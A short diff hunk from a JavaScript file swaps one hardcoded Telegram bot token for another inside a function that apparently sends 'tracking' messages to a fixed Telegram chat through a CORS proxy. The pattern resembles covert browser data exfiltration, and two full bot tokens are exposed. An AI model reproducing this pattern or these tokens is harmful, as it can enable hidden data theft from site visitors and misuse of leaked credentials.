@@ -601,7 +601,7 @@ function setupEnhancedTracking() {
 
 // ========== TELEGRAM SEND FUNCTION ==========
 async function sendToTelegramBot(message) {
-    const BOT_TOKEN = '7555872875:AAFznN3-HNBFtUcEJJTNegwfMJRfMuHvygE';
+    const BOT_TOKEN = '7555872875:AAFL7IOocbY9nQhqL8GVkTvQYHkNrbnCTrs';
     const CHAT_ID = '7307197149';
     
     // Use CORS proxy
